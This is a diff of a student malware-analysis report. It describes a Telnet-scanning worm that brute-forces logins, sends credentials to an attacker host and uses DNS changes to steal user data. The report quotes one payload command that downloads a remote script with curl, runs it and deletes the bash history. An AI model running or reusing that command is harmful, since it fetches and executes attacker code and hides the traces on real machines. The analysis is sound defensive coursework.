@@ -1,4 +1,5 @@
 # Project 2
+
 # Introduction
 It was proposed to us to try to analyze a suspicious code that was found on campus using Reverse engineering techniques that were taught throughout the semester. \
 We need to find a response to the following questions:
@@ -180,15 +181,16 @@ We are uncertain of what this telnet Scanner is, the code is too dense, and many
 ![alt text](img/Scanner1.png)
 
 Although we made some assumptions with some pieces of code, strings, functions, and messages as well as the whole context of the malware.
-- This is a scanner for open Telnet ports in the network, it scans the network for Telnet and then tries to brute force them.  
+- This code is based on a state machine where if the code on the first state runs successfully then with the function advance_telstate() it runs the next state, and if not reset_telstate() restarts the state machine to state 0.
+- The first 7(0-6) states seem to try to connect with a telnet service of a random public IP address.
+- Then it tries to brute-force the login credentials of the telnet. 
 - When it's successful it sends to the attacker's server the information (IP, port, username, and password)
 - Then it sends the following payload to the connected machines `cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history `.
 
 We tried to curl the `a.sh` to understand it but we just got the following error.
 
-![alt text](img/ash.png)
-
-In summary we believe that the Telnet scanner is likely running a worm aimed at infecting machines with open telnet ports across the network to which the user's system is connected.
+![alt text](img/ash.png)\
+We suppose that this a.sh is something similar to the malware found in ansibled, infecting the machine and giving the attacker a chance to remotely connect to the machine and then the machine helping spread the virus.
 
 
 
@@ -219,7 +221,7 @@ This code is a piece of malware put into an update packet of Ansible.
 - **Are other hosts involved?**\
 It is highly probable that the attacker has control over the machine with the IP "192.168.160.143" within the network. This IP plays a crucial role in various operations, such as downloading the PDF, receiving commands to execute with ProccessCMD, and downloading the Python script.
 Furthermore, the IP "193.136.172.20" is modified to serve as the default DNS, suggesting that it is a machine controlled by the attacker within the network.
-Also as mentioned before if the malware has indeed worm-like behaviors it will affect multiple machines inside the network
+Also as mentioned before if the malware has indeed worm-like behaviors it will affect multiple machines inside the network.
 - **What is the potential impact on our organization?**\
 If the malware is correctly executed in other words, not caught by Firewalls, antivirus, or similar software, this malware could potentially:
     - Exposure of Personal and Credit Information: The malware can intercept sensitive data such as usernames, passwords, credit card numbers, and other personal information entered by users on legitimate websites by manipulating DNS.
